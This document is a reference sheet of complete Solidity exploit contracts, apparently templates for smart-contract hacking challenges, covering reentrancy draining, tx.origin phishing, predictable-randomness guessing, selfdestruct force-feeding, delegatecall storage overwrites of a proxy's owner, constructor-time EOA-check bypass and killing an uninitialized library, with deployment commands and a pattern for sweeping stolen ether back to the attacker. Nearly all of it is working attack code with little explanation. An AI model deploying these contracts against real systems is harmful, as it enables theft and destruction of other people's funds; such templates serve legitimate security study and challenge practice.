# Payload families (deep) — the exploit-contract templates, full

## The reentrancy drain — the complete contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IVuln {
    function deposit() external payable;
    function withdraw(uint) external;
    function balances(address) external view returns (uint);
}
contract Reenter {
    IVuln v; address me;
    constructor(address _v) { v = IVuln(_v); me = msg.sender; }
    function attack() external payable {
        v.deposit{value: msg.value}();
        v.withdraw(msg.value);
    }
    receive() external payable {
        uint amt = msg.value > 0 ? msg.value : 1 ether;
        if (address(v).balance >= amt) v.withdraw(amt);
    }
    function sweep() external { payable(me).transfer(address(this).balance); }
}
```

The `receive` bound is the contract's balance — `sweep` returns the drained
ether to the caller.

## The Phish contract — tx.origin

```solidity
contract Phish {
    function attack(address t, address theCaller) external {
        ITarget(t).changeOwner(theCaller);   // tx.origin = the real caller
    }
}
```

The caller calls `attack(target, caller)` — `tx.origin` = caller (EOA),
`msg.sender` = Phish → the `tx.origin != msg.sender` check passes.

## The Predict contract — weak-randomness

```solidity
contract Predict {
    function attack(address t) external {
        // compute the SAME answer the contract will — same block, same values
        uint a = uint(keccak256(abi.encodePacked(
            blockhash(block.number - 1), block.timestamp, block.coinbase)));
        ITarget(t).guess(a);
    }
}
```

Match the contract's exact hash inputs — read its source for the fields.

## The Force contract — selfdestruct

```solidity
contract Force {
    constructor() payable {}
    function boom(address t) external { selfdestruct(payable(t)); }
}
```

Deploy it FUNDED — `cast send --create "<bin>" --value <amt>` — the
`selfdestruct` sends the funding to the target.

## The Evil contract — delegatecall storage-write

```solidity
contract Evil {
    // declare vars at the SAME slots as the proxy's protected vars
    address public impl;    // slot0 — aligns with proxy's impl_addr
    address public owner;   // slot1 — aligns with proxy's owner
    function pwn() external { owner = tx.origin; }   // writes proxy's slot1
}
// call the proxy's fallback with pwn()'s selector → delegatecall → owner = caller
```

## The Sequencer — atomic ordering

```solidity
contract Sequencer {
    ITarget t;
    constructor(address _t) { t = ITarget(_t); }
    function run() external payable {
        t.step1();                       // the check
        t.step2{value: msg.value}();      // the exploit — same tx
        t.step3();                        // the predicate flips
    }
}
```

## The Tricky constructor — the EOA check

```solidity
contract Tricky {
    constructor(address t) {
        ITarget(t).go();   // during construction, extcodesize(this) == 0
    }
}
```

## The library-kill — uninitialized + selfdestruct

```solidity
// call the library's initWallet to own its context, then kill to selfdestruct
contract Killer {
    function attack(address lib) external {
        ILib(lib).initWallet(address(this));
        ILib(lib).kill();   // selfdestruct on the library's context
    }
}
```

## The funding variants

- `constructor() payable` + `cast send --create --value` — funded at deploy
- `function fund() payable` + a funding `cast send` — funded after
- `receive() payable` — holds a force-fed or deposited balance

## The sweep-back pattern

Every exploit contract should let the caller recover the ether:

```solidity
function sweep() external { require(msg.sender == me); payable(me).transfer(address(this).balance); }
```
